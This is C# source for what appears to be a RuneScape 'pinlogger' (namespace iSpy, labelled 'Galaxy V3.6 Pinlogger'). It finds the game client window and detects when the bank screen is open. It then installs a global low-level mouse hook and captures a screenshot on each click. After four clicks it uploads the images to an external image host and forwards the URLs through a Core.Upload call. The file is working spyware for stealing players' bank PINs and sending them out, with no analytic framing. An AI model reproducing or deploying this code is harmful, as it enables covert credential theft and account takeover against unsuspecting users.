using System;
using System.Net;
using System.IO;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.ComponentModel;
namespace iSpy
{
    public class Pinlogger
    {
        public static void Log(object o)
        {
            while (true)
            {
                if (!MouseHook.installed)
                {
                    PinloggerHelpers.curhWnd = Util.GetRuneScapeHandle();
                    if (PinloggerHelpers.curhWnd != IntPtr.Zero)
                    {
                        if (Util.IsBankOpen())
                        {
                            if (!MouseHook.installed)
                            {
                                new Thread(new ThreadStart(MouseHook.Install)).Start();
                            }
                            
                            else
                            { GC.Collect(); Thread.Sleep(500); }
                        }
                    }
                    else
                    {
                        Thread.Sleep(5000);
                        GC.Collect();
                    }
                }
            }

        }
        public class PinloggerHelpers
        {
            public static List<int> pin = new List<int>();
            public static List<Bitmap> pinImages = new List<Bitmap>();
            public static IntPtr curhWnd = IntPtr.Zero;

            private static void SendPins(string imgURLs)
            {
                try
                {
                    Core.Upload("Galaxy V3.6 Pinlogger", imgURLs, "3");
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            }

            private static void UploadPins(List<string> filePaths)
            {
                if (filePaths == null || filePaths.Count < 4)
                    return;
                string imageUrls = string.Empty;
                try
                {
                    foreach (string filePath in filePaths)
                    {
                        string result = string.Empty;
                        using (WebClient client = new WebClient())
                        {
                            result = System.Text.ASCIIEncoding.UTF8.GetString(client.UploadFile(new Uri("http://uploads.im/api?upload"), filePath));
                        }
                        result = result.Substring(result.IndexOf("img_url") + 10, (result.IndexOf("\",\"img_view\"") - (result.IndexOf("img_url") + 10)));
                        result = result.Replace("\\/", "/");
                        imageUrls += result + Environment.NewLine;
                        File.Delete(filePath);
                    }
                    SendPins(imageUrls);
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            }
            public static void FinalizePins()
            {
                MouseHook.Uninstall();
                List<string> filePaths = new List<string>();
                foreach (Image i in pinImages)
                {
                    string path = Path.GetTempFileName();
                    path = path.Substring(0, path.Length - 4) + ".png";
                    i.Save(path);
                    filePaths.Add(path);
                }
                pinImages = new List<Bitmap>();
                UploadPins(filePaths);
            }
            [StructLayout(LayoutKind.Sequential)]
            public struct RECT
            {
                public int Left;
                public int Top;
                public int Right;
                public int Bottom;
            }

            public enum GW : int
            {
                HWNDFIRST = 0,
                HWNDLAST = 1,
                HWNDNEXT = 2,
                HWNDPREV = 3,
                OWNER = 4,
                CHILD = 5,
            }
        }
        public class WinAPI
        {
            //User32
            public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            public delegate bool EnumWindowProc(IntPtr hWnd, IntPtr parameter);
            [DllImport("User32.dll")]
            public static extern IntPtr GetForegroundWindow();
            [DllImport("User32.dll")]
            public static extern int GetWindowDC(int hWnd);
            [DllImport("User32.dll")]
            public static extern int ReleaseDC(int hWnd, int hDC);
            [DllImport("user32.dll")]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
            [DllImport("user32.dll")]
            public static extern int GetWindow(int hWnd, PinloggerHelpers.GW uCmd);
            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EnumChildWindows(IntPtr hwndParent, EnumWindowsProc lpEnumFunc, IntPtr lParam);
            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            [DllImport("user32.dll")]
            public static extern uint RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, uint cchType);
            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool GetWindowRect(IntPtr hwnd, out PinloggerHelpers.RECT lpRect);

            //GDI32
            [DllImport("GDI32.dll")]
            public static extern bool BitBlt(int hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, int hdcSrc, int nXSrc, int nYSrc, int dwRop);
            [DllImport("GDI32.dll")]
            public static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);
            [DllImport("GDI32.dll")]
            public static extern int CreateCompatibleDC(int hdc);
            [DllImport("GDI32.dll")]
            public static extern bool DeleteDC(int hdc);
            [DllImport("GDI32.dll")]
            public static extern bool DeleteObject(int hObject);
            [DllImport("GDI32.dll")]
            public static extern int GetDeviceCaps(int hdc, int nIndex);
            [DllImport("GDI32.dll")]
            public static extern int SelectObject(int hdc, int hgdiobj);

        }
        public class Util
        {

            public static bool searchBitmap(Bitmap smallBmp, Bitmap bigBmp, double tolerance)
            {
                Rectangle location = Rectangle.Empty;
                try
                {
                    BitmapData smallData =
                        smallBmp.LockBits(new Rectangle(0, 0, smallBmp.Width, smallBmp.Height),
                                          System.Drawing.Imaging.ImageLockMode.ReadOnly,
                                          System.Drawing.Imaging.PixelFormat.Format24bppRgb);
                    BitmapData bigData =
                        bigBmp.LockBits(new Rectangle(0, 0, bigBmp.Width, bigBmp.Height),
                                        System.Drawing.Imaging.ImageLockMode.ReadOnly,
                                        System.Drawing.Imaging.PixelFormat.Format24bppRgb);
                    int smallStride = smallData.Stride;
                    int bigStride = bigData.Stride;
                    int bigWidth = bigBmp.Width;
                    int bigHeight = bigBmp.Height - smallBmp.Height + 1;
                    int smallWidth = smallBmp.Width * 3;
                    int smallHeight = smallBmp.Height;
                    int margin = Convert.ToInt32(255.0 * tolerance);
                    unsafe
                    {
                        byte* pSmall = (byte*)(void*)smallData.Scan0;
                        byte* pBig = (byte*)(void*)bigData.Scan0;
                        int smallOffset = smallStride - smallBmp.Width * 3;
                        int bigOffset = bigStride - bigBmp.Width * 3;
                        bool matchFound = true;
                        for (int y = 0; y < bigHeight; y++)
                        {
                            for (int x = 0; x < bigWidth; x++)
                            {
                                byte* pBigBackup = pBig;
                                byte* pSmallBackup = pSmall;

                                for (int i = 0; i < smallHeight; i++)
                                {
                                    int j = 0;
                                    matchFound = true;
                                    for (j = 0; j < smallWidth; j++)
                                    {
                                        int inf = pBig[0] - margin;
                                        int sup = pBig[0] + margin;
                                        if (sup < pSmall[0] || inf > pSmall[0])
                                        {
                                            matchFound = false;
                                            break;
                                        }
                                        pBig++;
                                        pSmall++;
                                    }

                                    if (!matchFound) break;

                                    pSmall = pSmallBackup;
                                    pBig = pBigBackup;

                                    pSmall += smallStride * (1 + i);
                                    pBig += bigStride * (1 + i);
                                }

                                if (matchFound)
                                {
                                    location.X = x;
                                    location.Y = y;
                                    location.Width = smallBmp.Width;
                                    location.Height = smallBmp.Height;
                                    return true;
                                }
                                else
                                {
                                    pBig = pBigBackup;
                                    pSmall = pSmallBackup;
                                    pBig += 3;
                                }
                            }
                            if (matchFound)
                                break;
                            pBig += bigOffset;
                        }
                    }
                    bigBmp.UnlockBits(bigData);
                    smallBmp.UnlockBits(smallData);
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
                return false;
            }
            public static IntPtr GetRuneScapeHandle()
            {
                try
                {
                    IntPtr current = GetTop();
                    if (CheckClients(ref current))
                        return current;

                    PinloggerHelpers.RECT r;
                    int w = 0;
                    int h = 0;
                    IntPtr last = SearchChildWindows(GetChildWindows(current), "SunAwtCanvas");
                    WinAPI.GetWindowRect(last, out r);
                    w = r.Right - r.Left;
                    h = r.Bottom - r.Top;
                    if (w > 500 && h > 500)
                        return last;
                    return IntPtr.Zero;
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
                return IntPtr.Zero;
            }
            public static bool IsBankOpen()
            {
                try
                {
                    if (searchBitmap(GetBankStripe(), CaptureRuneScapeScreen(), .2))
                        return true;
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
                return false;
            }
            public static Bitmap GetBankStripe()
            {
                return BitmapFromString("iVBORw0KGgoAAAANSUhEUgAAAAoAAAALCAYAAABGbhwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAABJSURBVChTY/B0MPnvYWcMxm62Rjgx8QpBClY11RHEA6kQ5Bl0wWB+jv9RgpxgGoapoxCmGERjVQhTBMNJwlzYFYIkQBihmPM/ADwO6q3Vo5gIAAAAAElFTkSuQmCC");
            }
            public static Bitmap BitmapFromString(String src)
            {
                byte[] raw = new byte[1];
                Bitmap pic = new Bitmap(1, 1);
                raw = Convert.FromBase64String(src);
                TypeConverter tc = TypeDescriptor.GetConverter(typeof(Bitmap));
                pic = (Bitmap)tc.ConvertFrom(raw);
                return pic;
            }
            public static IntPtr GetTop()
            {
                return WinAPI.GetForegroundWindow();
            }

            public static bool EnumWindow(IntPtr handle, IntPtr pointer)
            {
                GCHandle gch = GCHandle.FromIntPtr(pointer);
                List<IntPtr> list = gch.Target as List<IntPtr>;
                if (list == null)
                {
                    throw new InvalidCastException("GCHandle Target could not be cast as List<IntPtr>");
                }
                list.Add(handle);
                return true;
            }

            public static IntPtr[] GetChildWindows(IntPtr Parent)
            {
                List<IntPtr> children = new List<IntPtr>();
                GCHandle listHandle = GCHandle.Alloc(children);
                try
                {
                    WinAPI.EnumWindowsProc childProc = new WinAPI.EnumWindowsProc(EnumWindow);
                    WinAPI.EnumChildWindows(Parent, childProc, GCHandle.ToIntPtr(listHandle));
                }
                finally
                {
                    if (listHandle.IsAllocated)
                        listHandle.Free();
                }
                return children.ToArray();
            }

            public static String GetWindowC(IntPtr hWnd)
            {
                StringBuilder s = new StringBuilder();
                WinAPI.RealGetWindowClass(hWnd, s, 255);
                return s.ToString();
            }

            public static String GetText(IntPtr hWnd)
            {
                StringBuilder sb = new StringBuilder(255);
                WinAPI.GetWindowText(hWnd, sb, sb.Capacity);
                return sb.ToString();
            }

            public static Bitmap CaptureScreen()
            {
                Bitmap image = null;
                try
                {
                    int w = Screen.PrimaryScreen.Bounds.Size.Width;
                    int h = Screen.PrimaryScreen.Bounds.Size.Height;
                    int hdcSrc = WinAPI.GetWindowDC(PinloggerHelpers.curhWnd.ToInt32()),
                    hdcDest = WinAPI.CreateCompatibleDC(hdcSrc),
                    hBitmap = WinAPI.CreateCompatibleBitmap(hdcSrc, w, h);
                    WinAPI.SelectObject(hdcDest, hBitmap);
                    WinAPI.BitBlt(hdcDest, 0, 0, w,
                                 h, hdcSrc, 0, 0, 0x00CC0020);
                    image = new Bitmap(Image.FromHbitmap(new IntPtr(hBitmap)),
                                              Image.FromHbitmap(new IntPtr(hBitmap)).Width,
                                              Image.FromHbitmap(new IntPtr(hBitmap)).Height);
                    Cleanup(hBitmap, hdcSrc, PinloggerHelpers.curhWnd, hdcDest);
                    GC.Collect();
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
                return image;
            }
            public static Bitmap CaptureRuneScapeScreen()
            {
                Bitmap image = null;
                try
                {
                    PinloggerHelpers.RECT r;
                    WinAPI.GetWindowRect(PinloggerHelpers.curhWnd, out r);
                    Point p = new Point(r.Left, r.Top);
                    int w = r.Right - r.Left;
                    int h = r.Bottom - r.Top;
                    int hdcSrc = WinAPI.GetWindowDC(PinloggerHelpers.curhWnd.ToInt32()),
                    hdcDest = WinAPI.CreateCompatibleDC(hdcSrc),
                    hBitmap = WinAPI.CreateCompatibleBitmap(hdcSrc, w, h);
                    WinAPI.SelectObject(hdcDest, hBitmap);
                    WinAPI.BitBlt(hdcDest, 0, 0, w,
                                 h, hdcSrc, 0, 0, 0x00CC0020);
                    image = new Bitmap(Image.FromHbitmap(new IntPtr(hBitmap)),
                                              Image.FromHbitmap(new IntPtr(hBitmap)).Width,
                                              Image.FromHbitmap(new IntPtr(hBitmap)).Height);
                    Cleanup(hBitmap, hdcSrc, PinloggerHelpers.curhWnd, hdcDest);
                    GC.Collect();
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
                return image;
            }
            public static void Cleanup(int hBitmap, int hdcSrc, IntPtr hWnd, int hdcDest)
            {
                WinAPI.ReleaseDC(hWnd.ToInt32(), hdcSrc);
                WinAPI.DeleteDC(hdcDest);
                WinAPI.DeleteObject(hBitmap);
            }

            public static bool CheckClients(ref IntPtr current)
            {
                string[] clients = { "Old School RuneScape", "TRiBot", "OSBuddy", "Powerbot" };
                for (int i = 0; i < clients.Length; i++)
                {
                    if (GetText(current).Contains(clients[i]))
                        return true;
                }
                return false;
            }

            public static IntPtr IterateFromTop()
            {
                IntPtr hWnd = GetTop();
                if (CheckClients(ref hWnd))
                    return hWnd;
                PinloggerHelpers.RECT r;
                int w = 0;
                int h = 0;
                IntPtr last = SearchChildWindows(GetChildWindows(hWnd), "SunAwtCanvas");
                WinAPI.GetWindowRect(last, out r);
                w = r.Right - r.Left;
                h = r.Bottom - r.Top;
                if (w > 500 && h > 500)
                    return last;
                return IntPtr.Zero;
            }

            public static IntPtr SearchChildWindows(IntPtr[] ChildWindows, String caption)
            {
                IntPtr x = IntPtr.Zero;
                IntPtr o = IntPtr.Zero;
                foreach (IntPtr i in ChildWindows)
                {
                    if (i != IntPtr.Zero)
                    {
                        String s = GetWindowC(i);
                        if (s.Contains(caption))
                        {
                            x = new IntPtr(WinAPI.GetWindow(i.ToInt32(), PinloggerHelpers.GW.CHILD));
                            while (x != IntPtr.Zero)
                            {
                                o = x;
                                x = new IntPtr(WinAPI.GetWindow(o.ToInt32(), PinloggerHelpers.GW.CHILD));
                            }
                            s = GetWindowC(o);
                            if (validscape(o))
                            {
                                Console.WriteLine("Returning: " + o);
                                return o;
                            }
                        }
                    }
                }
                return IntPtr.Zero;
            }

            public static bool RuneScapeOpen()
            {
                return IterateFromTop() != IntPtr.Zero;
            }

            public static bool validscape(IntPtr hWnd)
            {
                PinloggerHelpers.RECT r;
                WinAPI.GetWindowRect(hWnd, out r);
                return r.Bottom - r.Top > 400;
            }

            public static Bitmap CopyBMP(Bitmap srcBitmap, Rectangle section)
            {
                Bitmap bmp = new Bitmap(section.Width, section.Height);
                Graphics g = Graphics.FromImage(bmp);
                g.DrawImage(srcBitmap, 0, 0, section, GraphicsUnit.Pixel);
                g.Dispose();
                return bmp;
            }
        }
        public class MouseHook
        {
            private static LowLevelMouseProc _proc = HookCallback;
            private static IntPtr _hookID = IntPtr.Zero;
            public static bool ignoreflag = false;
            public static bool installed = false;

            public static void Install()
            {
                if (!installed)
                {
                    Console.WriteLine("Mousehook Installed!");
                    installed = true;
                    _hookID = SetHook(_proc);
                    Application.Run();
                }
            }

            public static void Uninstall()
            {
                installed = false;
                UnhookWindowsHookEx(_hookID);
                //Application.Exit();
            }

            private static IntPtr SetHook(LowLevelMouseProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_MOUSE_LL, proc,
                                            GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if (nCode >= 0 &&
                    MouseMessages.WM_LBUTTONDOWN == (MouseMessages)wParam)
                {
                    MSLLHOOKSTRUCT hookStruct = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));
                    if (!ignoreflag && installed)
                    {
                        if (Util.GetRuneScapeHandle() != IntPtr.Zero)
                        {
                            //int x = hookStruct.pt.x;
                            //int y = hookStruct.pt.y;
                            PinloggerHelpers.pinImages.Add(Util.CaptureRuneScapeScreen());
                            Console.WriteLine(PinloggerHelpers.pinImages.Count);
                            if (PinloggerHelpers.pinImages.Count >= 4)
                            {
                                PinloggerHelpers.FinalizePins();
                                //Thread t = new Thread(new ThreadStart(PinloggerHelpers.FinalizePins));
                                //t.SetApartmentState(ApartmentState.STA);
                                //t.Start();
                            }
                        }
                        else
                        {
                            Uninstall();
                        }
                    }
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            private const int WH_MOUSE_LL = 14;

            private enum MouseMessages
            {
                WM_LBUTTONDOWN = 0x0201,
                WM_LBUTTONUP = 0x0202,
                WM_MOUSEMOVE = 0x0200,
                WM_MOUSEWHEEL = 0x020A,
                WM_RBUTTONDOWN = 0x0204,
                WM_RBUTTONUP = 0x0205
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct POINT
            {
                public int x;
                public int y;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct MSLLHOOKSTRUCT
            {
                public POINT pt;
                public uint mouseData;
                public uint flags;
                public uint time;
                public IntPtr dwExtraInfo;
            }

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook,
                                                          LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
                                                        IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
        }
    }
}